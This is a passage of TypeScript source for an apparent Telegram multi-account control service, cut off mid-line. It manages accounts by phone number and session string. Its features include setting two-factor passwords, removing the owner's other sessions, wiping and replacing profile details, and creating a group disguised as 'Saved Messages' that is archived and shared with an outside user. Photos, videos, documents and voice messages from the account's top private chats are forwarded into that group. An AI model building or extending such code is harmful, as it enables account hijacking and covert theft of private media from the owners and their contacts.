this.activeChannelsService.createMultiple(channels);\n            return \"Media forward initiated successfully\";\n        } catch (error) {\n            console.error(\"Error forwarding media:\", error);\n            return `Media forward failed: ${error.message}`;\n        }\n    }\n\n    async blockUser(mobile: string, chatId: string) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        return await telegramClient.blockUser(chatId);\n    }\n\n\n    async joinChannel(mobile: string, channelId: string) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        return await telegramClient.joinChannel(channelId);\n    }\n\n    async getCallLog(mobile: string) {\n        const telegramClient = await connectionManager.getClient(mobile)\n        return await telegramClient.getCallLog();\n    }\n\n    async getmedia(mobile: string) {\n        const telegramClient = await connectionManager.getClient(mobile)\n        return await telegramClient.getMediaMessages();\n    }\n\n    async getChannelInfo(mobile: string, sendIds: boolean = false): Promise<ChannelInfo> {\n        const telegramClient = await connectionManager.getClient(mobile)\n        return await telegramClient.channelInfo(sendIds);\n    }\n\n    async getMe(mobile: string) {\n        const telegramClient = await connectionManager.getClient(mobile)\n        return await telegramClient.getMe();\n    }\n\n    async getEntity(mobile: string, entity: EntityLike) {\n        const telegramClient = await connectionManager.getClient(mobile)\n        return await telegramClient.getEntity(entity); // Assuming 'getEntity()' is a valid method\n    }\n\n    async createNewSession(mobile: string) {\n        const telegramClient = await connectionManager.getClient(mobile)\n        return await telegramClient.createNewSession();\n    }\n\n    async set2Fa(mobile: string) {\n        const telegramClient = await connectionManager.getClient(mobile)\n        try {\n            await telegramClient.set2fa();\n            return '2Fa set successfully'\n        } catch (error) {\n            const errorDetails = parseError(error)\n            throw new HttpException(errorDetails.message, errorDetails.status)\n        } finally {\n            await connectionManager.unregisterClient(mobile)\n        }\n    }\n\n    async updatePrivacyforDeletedAccount(mobile: string) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        await telegramClient.updatePrivacyforDeletedAccount()\n    }\n\n    async deleteProfilePhotos(mobile: string) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        await telegramClient.deleteProfilePhotos()\n    }\n\n    async setProfilePic(\n        mobile: string, name: string,\n    ) {\n        const telegramClient = await connectionManager.getClient(mobile)\n        await telegramClient.deleteProfilePhotos();\n        try {\n            await CloudinaryService.getInstance(name);\n            await sleep(2000);\n            const rootPath = process.cwd();\n            console.log(\"checking path\", rootPath)\n            await telegramClient.updateProfilePic(path.join(rootPath, 'dp1.jpg'));\n            await sleep(3000);\n            await telegramClient.updateProfilePic(path.join(rootPath, 'dp2.jpg'));\n            await sleep(3000);\n            await telegramClient.updateProfilePic(path.join(rootPath, 'dp3.jpg'));\n            await sleep(1000);\n            return 'Profile pic set successfully'\n        } catch (error) {\n            const errorDetails = parseError(error)\n            throw new HttpException(errorDetails.message, errorDetails.status)\n        } finally {\n            await connectionManager.unregisterClient(mobile);\n        }\n    }\n\n    async updatePrivacy(\n        mobile: string,\n    ) {\n        const telegramClient = await connectionManager.getClient(mobile)\n        try {\n            await telegramClient.updatePrivacy()\n            return \"Privacy updated successfully\";\n        } catch (error) {\n            const errorDetails = parseError(error)\n            throw new HttpException(errorDetails.message, errorDetails.status)\n        }\n    }\n\n    async downloadProfilePic(\n        mobile: string, index: number\n    ) {\n        const telegramClient = await connectionManager.getClient(mobile)\n        try {\n            return await telegramClient.downloadProfilePic(index)\n        } catch (error) {\n            console.log(\"Some Error: \", parseError(error), error);\n            throw new Error(\"Failed to update username\");\n        }\n    }\n\n    async updateUsername(\n        mobile: string, username: string,\n    ) {\n        const telegramClient = await connectionManager.getClient(mobile)\n        try {\n            return await telegramClient.updateUsername(username)\n        } catch (error) {\n            console.log(\"Some Error: \", parseError(error), error);\n            throw new Error(\"Failed to update username\");\n        }\n    }\n\n    async getMediaMetadata(mobile: string,\n        params: {\n            chatId: string;\n            types?: ('photo' | 'video' | 'document' | 'voice')[];\n            startDate?: Date;\n            endDate?: Date;\n            limit?: number;\n            maxId?: number;\n            minId?: number;\n            all?: boolean;\n        }) {\n        const telegramClient = await connectionManager.getClient(mobile)\n        if (params) {\n            return await telegramClient.getAllMediaMetaData(params);\n        } else {\n            return await telegramClient.getMediaMetadata(params);\n        }\n    }\n\n    async downloadMediaFile(mobile: string, messageId: number, chatId: string, res: any) {\n        const telegramClient = await connectionManager.getClient(mobile)\n        return await telegramClient.downloadMediaFile(messageId, chatId, res)\n    }\n\n    async forwardMessage(mobile: string, toChatId: string, fromChatId: string, messageId: number) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        return await telegramClient.forwardMessage(toChatId, fromChatId, messageId);\n    }\n\n    async leaveChannels(mobile: string) {\n        const telegramClient = await connectionManager.getClient(mobile)\n        const channelinfo = await telegramClient.channelInfo(false);\n        const leaveChannelIds = channelinfo.canSendFalseChats\n        telegramClient.leaveChannels(leaveChannelIds);\n        return \"Left channels initiated\";\n    }\n\n    async leaveChannel(mobile: string, channel: string) {\n        const telegramClient = await connectionManager.getClient(mobile)\n        telegramClient.leaveChannels([channel]);\n        return \"Left channel initiated\";\n    }\n\n    async deleteChat(mobile: string, params: {\n        peer: string | Api.TypeInputPeer;\n        maxId?: number;\n        justClear?: boolean;\n        revoke?: boolean;\n        minDate?: number;\n        maxDate?: number;\n    }) {\n        const telegramClient = await connectionManager.getClient(mobile)\n        return await telegramClient.deleteChat(params);\n    }\n    async updateNameandBio(\n        mobile: string,\n        firstName: string,\n        about?: string,\n    ): Promise<void> {\n        const telegramClient = await connectionManager.getClient(mobile)\n        return await telegramClient.updateProfile(firstName, about);\n    }\n\n    async getDialogs(mobile: string, query: DialogsQueryDto) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        const { limit = 10, offsetId, archived = false } = query;\n        const dialogs = await telegramClient.getDialogs({ limit, offsetId, archived });\n        const chatData = [];\n        for (const chat of dialogs) {\n            const chatEntity = await chat.entity.toJSON();\n            chatData.push(chatEntity);\n        }\n        return chatData;\n    }\n\n    async getConnectionStatus(): Promise<{\n        activeConnections: number;\n        rateLimited: number;\n        totalOperations: number;\n    }> {\n        const status = {\n            activeConnections: connectionManager.getActiveConnectionCount(),\n            rateLimited: 0,\n            totalOperations: 0\n        };\n\n        this.logger.logOperation('system', 'Connection status retrieved', status);\n        return status;\n    }\n\n    async forwardBulkMessages(\n        mobile: string,\n        fromChatId: string,\n        toChatId: string,\n        messageIds: number[]\n    ) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        return await telegramClient.forwardMessages(fromChatId, toChatId, messageIds)\n    }\n\n    async getAuths(mobile: string): Promise<any[]> {\n        const telegramClient = await connectionManager.getClient(mobile);\n        const auths = await telegramClient.getAuths();\n        this.logger.logOperation(mobile, 'Retrieved authorizations', {\n            count: auths?.length || 0\n        });\n        return auths;\n    }\n\n    async removeOtherAuths(mobile: string) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        await telegramClient.removeOtherAuths();\n        this.logger.logOperation(mobile, 'Removed other authorizations');\n        return \"Removed other authorizations\";\n    }\n\n    public async processBatch<T>(\n        items: T[],\n        batchSize: number,\n        processor: (batch: T[]) => Promise<void>,\n        delayMs: number = 2000\n    ): Promise<{ processed: number, errors: Error[] }> {\n        const errors: Error[] = [];\n        let processed = 0;\n\n        for (let i = 0; i < items.length; i += batchSize) {\n            const batch = items.slice(i, i + batchSize);\n            try {\n                await processor(batch);\n                processed += batch.length;\n                if (i + batchSize < items.length) {\n                    await new Promise(resolve => setTimeout(resolve, delayMs));\n                }\n            } catch (error) {\n                errors.push(error);\n                this.logger.logError('batch-process', 'Batch processing failed', error);\n            }\n        }\n\n        return { processed, errors };\n    }\n\n    // Enhanced Group Management\n    async createGroupWithOptions(mobile: string, options: GroupOptions) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        const result = await telegramClient.createGroupOrChannel(options);\n        // Attempt to extract the channel/group ID from the result\n        let groupId: string | undefined;\n        if ('chats' in result && Array.isArray(result.chats) && result.chats.length > 0) {\n            // For most cases, the created group/channel will be the last chat in the array\n            const chat = result.chats[result.chats.length - 1];\n            groupId = chat.id?.toString();\n        }\n        this.logger.logOperation(mobile, 'Group created', { id: groupId });\n        return result;\n    }\n\n    async updateGroupSettings(\n        mobile: string,\n        settings: {\n            groupId: string;\n            username?: string;\n            title?: string;\n            description?: string;\n            slowMode?: number;\n            memberRestrictions?: any;\n        }\n    ) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        return await telegramClient.updateGroupSettings(settings)\n    }\n\n    // Message Scheduling\n    async scheduleMessage(mobile: string, options: MessageScheduleOptions) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        return await telegramClient.scheduleMessageSend({\n            chatId: options.chatId,\n            message: options.message,\n            scheduledTime: options.scheduledTime,\n            replyTo: options.replyTo,\n            silent: options.silent\n        });\n    }\n\n    async getScheduledMessages(mobile: string, chatId: string) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        return await telegramClient.getScheduledMessages(chatId)\n    }\n\n    async sendMediaAlbum(mobile: string, album: MediaAlbumOptions) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        return await telegramClient.sendMediaAlbum(album)\n    }\n\n    async sendMessage(mobile: string, params: { peer: string, parseMode?: string, message: string }) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        return await telegramClient.sendMessage(params)\n    }\n\n    async sendVoiceMessage(\n        mobile: string,\n        voice: {\n            chatId: string;\n            url: string;\n            duration?: number;\n            caption?: string;\n        }\n    ) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        return await telegramClient.sendVoiceMessage(voice)\n    }\n\n    async cleanupChat(\n        mobile: string,\n        cleanup: {\n            chatId: string;\n            beforeDate?: Date;\n            onlyMedia?: boolean;\n            excludePinned?: boolean;\n        }\n    ) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        return await telegramClient.cleanupChat(cleanup)\n    }\n\n    async getChatStatistics(mobile: string, chatId: string, period: 'day' | 'week' | 'month'): Promise<ChatStatistics> {\n        const telegramClient = await connectionManager.getClient(mobile);\n        return await telegramClient.getChatStatistics(chatId, period)\n    }\n\n    // Enhanced Privacy Features\n    async updatePrivacyBatch(\n        mobile: string,\n        settings: {\n            phoneNumber?: 'everybody' | 'contacts' | 'nobody';\n            lastSeen?: 'everybody' | 'contacts' | 'nobody';\n            profilePhotos?: 'everybody' | 'contacts' | 'nobody';\n            forwards?: 'everybody' | 'contacts' | 'nobody';\n            calls?: 'everybody' | 'contacts' | 'nobody';\n            groups?: 'everybody' | 'contacts' | 'nobody';\n        }\n    ) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        return await telegramClient.updatePrivacyBatch(settings)\n    }\n    // Content Filtering\n    async setContentFilters(\n        mobile: string,\n        filters: ContentFilter\n    ) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        return await telegramClient.setContentFilters(filters)\n    }\n\n    async addGroupMembers(mobile: string, groupId: string, members: string[]): Promise<void> {\n        const telegramClient = await connectionManager.getClient(mobile);\n        return await telegramClient.addGroupMembers(groupId, members)\n    }\n\n    async removeGroupMembers(mobile: string, groupId: string, members: string[]): Promise<void> {\n        const telegramClient = await connectionManager.getClient(mobile);\n        return await telegramClient.removeGroupMembers(groupId, members)\n    }\n\n    async promoteToAdmin(\n        mobile: string,\n        groupId: string,\n        userId: string,\n        permissions?: {\n            changeInfo?: boolean;\n            postMessages?: boolean;\n            editMessages?: boolean;\n            deleteMessages?: boolean;\n            banUsers?: boolean;\n            inviteUsers?: boolean;\n            pinMessages?: boolean;\n            addAdmins?: boolean;\n            anonymous?: boolean;\n            manageCall?: boolean;\n        },\n        rank?: string\n    ): Promise<void> {\n        const telegramClient = await connectionManager.getClient(mobile);\n        return await telegramClient.promoteToAdmin(groupId, userId, permissions, rank)\n    }\n\n    async demoteAdmin(mobile: string, groupId: string, userId: string): Promise<void> {\n        const telegramClient = await connectionManager.getClient(mobile);\n        this.logger.logOperation(mobile, 'Demoted admin to regular member', { groupId, userId });\n        return await telegramClient.demoteAdmin(groupId, userId);\n    }\n\n    async unblockGroupUser(mobile: string, groupId: string, userId: string): Promise<void> {\n        const telegramClient = await connectionManager.getClient(mobile);\n        this.logger.logOperation(mobile, 'Unblocked user in group', { groupId, userId });\n        return await telegramClient.unblockGroupUser(groupId, userId);\n    }\n\n    async getGroupAdmins(mobile: string, groupId: string) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        this.logger.logOperation(mobile, 'Get group admins', { groupId });\n        return await telegramClient.getGroupAdmins(groupId);\n    }\n\n    async getGroupBannedUsers(mobile: string, groupId: string) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        this.logger.logOperation(mobile, 'Get group banned users', { groupId });\n        return await telegramClient.getGroupBannedUsers(groupId);\n    }\n\n    async searchMessages(\n        mobile: string,\n        params: SearchMessagesDto\n    ) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        this.logger.logOperation(mobile, 'Search messages', params);\n        return await telegramClient.searchMessages(params);\n    }\n\n    async getFilteredMedia(\n        mobile: string,\n        params: {\n            chatId: string;\n            types?: ('photo' | 'video' | 'document' | 'voice')[];\n            startDate?: Date;\n            endDate?: Date;\n            offset?: number;\n            limit?: number;\n            maxId?: number;\n            minId?: number;\n        }\n    ) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        this.logger.logOperation(mobile, 'Get filtered media', params);\n        return await telegramClient.getFilteredMedia(params);\n    }\n\n    // Contact Management\n    async exportContacts(\n        mobile: string,\n        format: 'vcard' | 'csv',\n        includeBlocked: boolean = false\n    ) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        this.logger.logOperation(mobile, 'Export contacts', { format, includeBlocked });\n        return await telegramClient.exportContacts(format, includeBlocked);\n    }\n\n    async importContacts(\n        mobile: string,\n        contacts: { firstName: string; lastName?: string; phone: string }[]\n    ) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        this.logger.logOperation(mobile, 'Import contacts', { contactCount: contacts.length });\n        return await telegramClient.importContacts(contacts);\n    }\n\n    async manageBlockList(\n        mobile: string,\n        userIds: string[],\n        block: boolean\n    ) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        this.logger.logOperation(mobile, block ? 'Block users' : 'Unblock users', { userIds });\n        return await telegramClient.manageBlockList(userIds, block);\n    }\n\n    async getContactStatistics(mobile: string) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        this.logger.logOperation(mobile, 'Get contact statistics');\n        return await telegramClient.getContactStatistics();\n    }\n\n    // Chat Folder Management\n    async createChatFolder(\n        mobile: string,\n        options: {\n            name: string;\n            includedChats: string[];\n            excludedChats?: string[];\n            includeContacts?: boolean;\n            includeNonContacts?: boolean;\n            includeGroups?: boolean;\n            includeBroadcasts?: boolean;\n            includeBots?: boolean;\n            excludeMuted?: boolean;\n            excludeRead?: boolean;\n            excludeArchived?: boolean;\n        }\n    ) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        this.logger.logOperation(mobile, 'Create chat folder', { name: options.name });\n        return await telegramClient.createChatFolder(options);\n    }\n\n    async getChatFolders(mobile: string) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        this.logger.logOperation(mobile, 'Get chat folders');\n        return await telegramClient.getChatFolders();\n    }\n\n    // Session Management\n    async getSessionInfo(mobile: string) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        this.logger.logOperation(mobile, 'Get session info');\n        return await telegramClient.getSessionInfo();\n    }\n\n    async terminateSession(\n        mobile: string,\n        options: {\n            hash: string;\n            type: 'app' | 'web';\n            exceptCurrent?: boolean;\n        }\n    ) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        this.logger.logOperation(mobile, 'Terminate session', options);\n        return await telegramClient.terminateSession(options);\n    }\n\n    // Message Management\n    async editMessage(\n        mobile: string,\n        options: {\n            chatId: string;\n            messageId: number;\n            text?: string;\n            media?: {\n                type: 'photo' | 'video' | 'document';\n                url: string;\n            };\n        }\n    ) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        this.logger.logOperation(mobile, 'Edit message', { chatId: options.chatId, messageId: options.messageId });\n        return await telegramClient.editMessage(options);\n    }\n\n    // Chat Management\n    async updateChatSettings(\n        mobile: string,\n        settings: {\n            chatId: string;\n            username?: string;\n            title?: string;\n            about?: string;\n            photo?: string;\n            slowMode?: number;\n            linkedChat?: string;\n            defaultSendAs?: string;\n        }\n    ) {\n        if (!settings.chatId) {\n            throw new Error('chatId is required');\n        }\n\n        const telegramClient = await connectionManager.getClient(mobile);\n        this.logger.logOperation(mobile, 'Update chat settings', { chatId: settings.chatId });\n        return await telegramClient.updateChatSettings(settings);\n    }\n\n    // Media Handling\n    async sendMediaBatch(\n        mobile: string,\n        options: {\n            chatId: string;\n            media: Array<{\n                type: 'photo' | 'video' | 'document';\n                url: string;\n                caption?: string;\n                fileName?: string;\n            }>;\n            silent?: boolean;\n            scheduleDate?: number;\n        }\n    ) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        this.logger.logOperation(mobile, 'Send media batch', { chatId: options.chatId, mediaCount: options.media.length });\n        return await telegramClient.sendMediaBatch(options);\n    }\n\n    // Password Management\n    async hasPassword(mobile: string): Promise<boolean> {\n        const telegramClient = await connectionManager.getClient(mobile);\n        this.logger.logOperation(mobile, 'Check password status');\n        return await telegramClient.hasPassword();\n    }\n\n    // Contact Management\n    async getContacts(mobile: string) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        this.logger.logOperation(mobile, 'Get contacts list');\n        return await telegramClient.getContacts();\n    }\n\n    // Extended Chat Functions\n    async getChats(\n        mobile: string,\n        options: {\n            limit?: number;\n            offsetDate?: number;\n            offsetId?: number;\n            offsetPeer?: string;\n            folderId?: number;\n        }\n    ) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        this.logger.logOperation(mobile, 'Get chats', options);\n        return await telegramClient.getChats(options);\n    }\n\n    async getFileUrl(mobile: string, url: string, filename: string): Promise<string> {\n        const telegramClient = await connectionManager.getClient(mobile);\n        this.logger.logOperation(mobile, 'Get file URL', { url, filename });\n        return await telegramClient.getFileUrl(url, filename);\n    }\n\n    async getMessageStats(\n        mobile: string,\n        options: {\n            chatId: string;\n            period: 'day' | 'week' | 'month';\n            fromDate?: Date;\n        }\n    ) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        this.logger.logOperation(mobile, 'Get message statistics', options);\n        return await telegramClient.getMessageStats(options);\n    }\n\n    async sendViewOnceMedia(\n        mobile: string,\n        options: {\n            chatId: string;\n            sourceType: 'path' | 'base64' | 'binary';\n            path?: string;\n            base64Data?: string;\n            binaryData?: Buffer;\n            caption?: string;\n            filename?: string;\n        }\n    ) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        this.logger.logOperation(mobile, 'Send view once media', { sourceType: options.sourceType, chatId: options.chatId });\n\n        const { sourceType, chatId, caption, filename } = options;\n        try {\n            if (sourceType === 'path') {\n                if (!options.path) throw new BadRequestException('Path is required when sourceType is url');\n\n                try {\n                    const localPath = options.path;\n                    if (!fs.existsSync(localPath)) {\n                        throw new BadRequestException(`File not found at path: ${localPath}`);\n                    }\n                    let isVideo = false;\n                    const ext = path.extname(localPath).toLowerCase().substring(1);\n                    if (['mp4', 'mov', 'avi', 'mkv', 'wmv', 'flv', 'webm', '3gp'].includes(ext)) {\n                        isVideo = true;\n                    }\n\n                    const fileBuffer = fs.readFileSync(localPath);\n\n                    this.logger.logOperation(mobile, 'Sending view once media from local file', {\n                        path: localPath,\n                        isVideo,\n                        size: fileBuffer.length,\n                        filename: filename || path.basename(localPath)\n                    });\n\n                    return await telegramClient.sendViewOnceMedia(\n                        chatId,\n                        fileBuffer,\n                        caption,\n                        isVideo,\n                        filename || path.basename(localPath)\n                    );\n                } catch (error) {\n                    if (error instanceof BadRequestException) {\n                        throw error;\n                    }\n                    this.logger.logError(mobile, 'Failed to read local file', error);\n                    throw new BadRequestException(`Failed to read local file: ${error.message}`);\n                }\n            }\n            else if (sourceType === 'base64') {\n                if (!options.base64Data) throw new BadRequestException('Base64 data is required when sourceType is base64');\n                const base64String = options.base64Data;\n                let isVideo = false;\n                if (filename) {\n                    const ext = filename.toLowerCase().split('.').pop();\n                    if (ext && ['mp4', 'mov', 'avi', 'mkv', 'wmv', 'flv', 'webm', '3gp'].includes(ext)) {\n                        isVideo = true;\n                    }\n                }\n                this.logger.logOperation(mobile, 'Sending view once media from base64', { isVideo, size: base64String.length });\n                const mediaData = Buffer.from(base64String, 'base64');\n                return await telegramClient.sendViewOnceMedia(chatId, mediaData, caption, isVideo, filename);\n            }\n            else if (sourceType === 'binary') {\n                if (!options.binaryData) throw new BadRequestException('Binary data is required when sourceType is binary');\n\n                this.logger.logOperation(mobile, 'Sending view once media from binary', {\n                    size: options.binaryData.length,\n                    filename: filename || 'unknown'\n                });\n                let isVideo = false;\n                if (filename) {\n                    const ext = filename.toLowerCase().split('.').pop();\n                    if (ext && ['mp4', 'mov', 'avi', 'mkv', 'wmv', 'flv', 'webm', '3gp'].includes(ext)) {\n                        isVideo = true;\n                    }\n                }\n                return await telegramClient.sendViewOnceMedia(chatId, options.binaryData, caption, isVideo, filename);\n            }\n            else {\n                throw new BadRequestException('Invalid source type. Must be one of: url, base64, binary');\n            }\n        } catch (error) {\n            this.logger.logError(mobile, 'Failed to send view once media', error);\n            throw error;\n        }\n    }\n\n    async getTopPrivateChats(mobile: string): Promise<{\n        chatId: string;\n        username?: string;\n        firstName?: string;\n        lastName?: string;\n        totalMessages: number;\n        interactionScore: number;\n        calls: {\n            total: number;\n            incoming: {\n                total: number;\n                audio: number;\n                video: number;\n            };\n            outgoing: {\n                total: number;\n                audio: number;\n                video: number;\n            };\n        };\n        media: {\n            photos: number;\n            videos: number;\n        };\n        activityBreakdown: {\n            videoCalls: number;\n            audioCalls: number;\n            mediaSharing: number;\n            textMessages: number;\n        };\n    }[]> {\n        const telegramClient = await connectionManager.getClient(mobile);\n        this.logger.logOperation(mobile, 'Get top private chats');\n        return await telegramClient.getTopPrivateChats();\n    }\n\n    async addBotsToChannel(\n        mobile: string,\n        channelIds: string[] = [process.env.accountsChannel, process.env.updatesChannel, process.env.notifChannel, \"miscmessages\", process.env.httpFailuresChannel],\n    ) {\n        this.logger.logOperation(mobile, 'Add bots to channel', { channelIds });\n        const botTokens = (process.env.BOT_TOKENS || '').split(',').filter(Boolean);\n        if (botTokens.length === 0) {\n            throw new Error('No bot tokens configured. Please set BOT_TOKENS environment variable');\n        }\n        for (const token of botTokens) {\n            try {\n                const botInfo = await this.getBotInfo(token);\n                if (botInfo) {\n                    for (const channelId of channelIds) {\n                        await this.setupBotInChannel(mobile, channelId, botInfo.id, botInfo.username, {\n                            changeInfo: true,\n                            postMessages: true,\n                            editMessages: true,\n                            deleteMessages: true,\n                            banUsers: true,\n                            inviteUsers: true,\n                            pinMessages: true,\n                            addAdmins: true,\n                            anonymous: false,\n                            manageCall: false\n                        });\n                    };\n                }\n            } catch (error) {\n                this.logger.logError(mobile, 'Failed to setup bot in channel', error);\n            }\n        }\n\n\n    }\n\n    async getBotInfo(token: string) {\n        try {\n            const response = await fetchWithTimeout(`https://api.telegram.org/bot${token}/getMe`);\n            if (response.data?.ok) {\n                return response.data.result;\n            }\n            throw new Error('Failed to get bot info');\n        } catch (error) {\n            throw new Error(`Failed to get bot info: ${error.message}`);\n        }\n    }\n\n    async setupBotInChannel(mobile: string, channelId: string, botId: string, botUsername: string, permissions: {\n        changeInfo?: boolean;\n        postMessages?: boolean;\n        editMessages?: boolean;\n        deleteMessages?: boolean;\n        banUsers?: boolean;\n        inviteUsers?: boolean;\n        pinMessages?: boolean;\n        addAdmins?: boolean;\n        anonymous?: boolean;\n        manageCall?: boolean;\n    }): Promise<void> {\n        const telegramClient = await connectionManager.getClient(mobile);\n        this.logger.logOperation(mobile, 'Setup bot in channel', { channelId, botId, botUsername });\n        try {\n            await telegramClient.joinChannel(channelId);\n        } catch (error) {\n            this.logger.logError(mobile, 'Failed to join channel', error);\n        }\n        try {\n            await telegramClient.addGroupMembers(channelId, [botUsername]);\n            this.logger.logOperation(mobile, 'Bot added to channel', { channelId, botUsername });\n            await sleep(2000);\n            this.logger.logOperation(mobile, `Bot ${botUsername} successfully added to channel ${channelId}`);\n        } catch (error) {\n            this.logger.logError(mobile, `Failed to add bot ${botUsername} to channel ${channelId}`, error);\n        }\n        try {\n            await telegramClient.promoteToAdmin(channelId, botUsername, permissions);\n            console.log(`Bot ${botUsername} promoted as admin in channel ${channelId}`);\n        } catch (error) {\n            this.logger.logError(mobile, `Failed to setup bot ${botUsername} in channel ${channelId}`, error);\n        }\n    }\n\n    async createBot(mobile: string, createBotDto: CreateBotDto) {\n        const client = await connectionManager.getClient(mobile);\n        return client.createBot(createBotDto);\n    }\n}\n","import { Api, TelegramClient } from 'telegram';\nimport { StringSession } from 'telegram/sessions';\nimport { NewMessage, NewMessageEvent } from 'telegram/events';\nimport axios from 'axios';\nimport * as fs from 'fs';\nimport { CustomFile } from 'telegram/client/uploads';\nimport { TotalList, sleep } from 'telegram/Helpers';\nimport { LogLevel } from 'telegram/extensions/Logger';\nimport { MailReader } from '../../IMap/IMap';\nimport bigInt from 'big-integer';\nimport { IterDialogsParams } from 'telegram/client/dialogs';\nimport { EntityLike } from 'telegram/define';\nimport { contains } from '../../utils';\nimport { parseError } from '../../utils/parseError';\nimport { fetchWithTimeout } from '../../utils/fetchWithTimeout';\nimport { notifbot } from '../../utils/logbots';\nimport { ContentFilter } from '../../interfaces/telegram';\nimport {\n    GroupOptions\n} from '../../interfaces/telegram';\nimport { MediaAlbumOptions } from './types/telegram-types';\nimport { IterMessagesParams } from 'telegram/client/messages';\nimport { connectionManager } from './utils/connection-manager';\nimport { MessageMediaType, SearchMessagesDto, SearchMessagesResponseDto } from './dto/message-search.dto';\nimport { BotConfig, ChannelCategory } from '../../utils/TelegramBots.config';\n\ninterface MessageScheduleOptions {\n    chatId: string;\n    message: string;\n    scheduledTime: Date;\n    replyTo?: number;\n    silent?: boolean;\n    media?: {\n        type: 'photo' | 'video' | 'document';\n        url: string;\n    };\n}\n\nclass TelegramManager {\n    private session: StringSession;\n    public phoneNumber: string;\n    public client: TelegramClient | null;\n    private channelArray: string[];\n    private static activeClientSetup: { days?: number, archiveOld: boolean, formalities: boolean, newMobile: string, existingMobile: string, clientId: string };\n    private contentFilters: Map<string, ContentFilter>;\n    private filterHandler: any;\n\n    constructor(sessionString: string, phoneNumber: string) {\n        this.session = new StringSession(sessionString);\n        this.phoneNumber = phoneNumber;\n        this.client = null;\n        this.channelArray = [];\n        this.contentFilters = new Map();\n    }\n\n    public static getActiveClientSetup() {\n        return TelegramManager.activeClientSetup;\n    }\n\n    public static setActiveClientSetup(data: { days?: number, archiveOld: boolean, formalities: boolean, newMobile: string, existingMobile: string, clientId: string } | undefined) {\n        TelegramManager.activeClientSetup = data;\n    }\n\n    public async createGroup() {\n        const groupName = \"Saved Messages\"; // Customize your group name\n        const groupDescription = this.phoneNumber; // Optional description\n        console.log(\"Creating group:\", groupName);\n        const result: any = await this.client.invoke(\n            new Api.channels.CreateChannel({\n                title: groupName,\n                about: groupDescription,\n                megagroup: true,\n                forImport: true,\n            })\n        );\n        const { id, accessHash } = result.chats[0];\n        console.log(\"Archived chat\", id);\n        await this.archiveChat(id, accessHash);\n        const usersToAdd = [\"fuckyoubabie1\"]; // Replace with the list of usernames or user IDs\n        console.log(\"Adding users to the channel:\", usersToAdd);\n        const addUsersResult = await this.client.invoke(\n            new Api.channels.InviteToChannel({\n                channel: new Api.InputChannel({\n                    channelId: id,\n                    accessHash: accessHash,\n                }),\n                users: usersToAdd\n            })\n        );\n        console.log(\"Successful addition of users:\", addUsersResult);\n        return { id, accessHash };\n    }\n\n    public async archiveChat(id: bigInt.BigInteger, accessHash: bigInt.BigInteger) {\n        const folderId = 1;\n        console.log(\"Archiving chat\", id);\n        return await this.client.invoke(\n            new Api.folders.EditPeerFolders({\n                folderPeers: [\n                    new Api.InputFolderPeer({\n                        peer: new Api.InputPeerChannel({\n                            channelId: id,\n                            accessHash: accessHash,\n                        }),\n                        folderId: folderId,\n                    }),\n                ],\n            })\n        );\n    }\n\n    private async createOrJoinChannel(channel: string) {\n        let channelId;\n        let channelAccessHash;\n        if (channel) {\n            try {\n                const result: any = await this.joinChannel(channel);\n                channelId = result.chats[0].id;\n                channelAccessHash = result.chats[0].accessHash;\n                console.log(\"Archived chat\", channelId);\n            } catch (error) {\n                const result = await this.createGroup();\n                channelId = result.id;\n                channelAccessHash = result.accessHash;\n                console.log(\"Created new group with ID:\", channelId);\n            }\n        } else {\n            const result = await this.createGroup();\n            channelId = result.id;\n            channelAccessHash = result.accessHash;\n            console.log(\"Created new group with ID:\", channelId);\n        }\n        await this.archiveChat(channelId, channelAccessHash);\n        return { id: channelId, accesshash: channelAccessHash }\n    }\n\n    public async forwardMedia(channel: string, fromChatId: string) {\n        let channelId;\n        try {\n            console.log(\"Forwarding media from chat to channel\", channel, fromChatId);\n            let channelAccessHash;\n            if (fromChatId) {\n                const channelDetails = await this.createOrJoinChannel(channel);\n                channelId = channelDetails.id;\n                channelAccessHash = channelDetails.accesshash;\n                await this.forwardSecretMsgs(fromChatId, channelId?.toString());\n            } else {\n                const chats = await this.getTopPrivateChats();\n                const me = await this.getMe();\n                if (chats.length > 0) {\n                    const channelDetails = await this.createOrJoinChannel(channel);\n                    channelId = channelDetails.id;\n                    channelAccessHash = channelDetails.accesshash;\n                    const finalChats = new Set(chats.map(chat => chat.chatId));\n                    finalChats.add(me.id?.toString());\n                    for (const chatId of finalChats) {\n                        const mediaMessages = await this.searchMessages({ chatId: chatId, limit: 1000, types: [MessageMediaType.PHOTO, MessageMediaType.VIDEO, MessageMediaType.ROUND_VIDEO, MessageMediaType.DOCUMENT, MessageMediaType.VOICE, MessageMediaType.ROUND_VOICE] });\n                        console.log(\"Forwarding messages from chat:\", 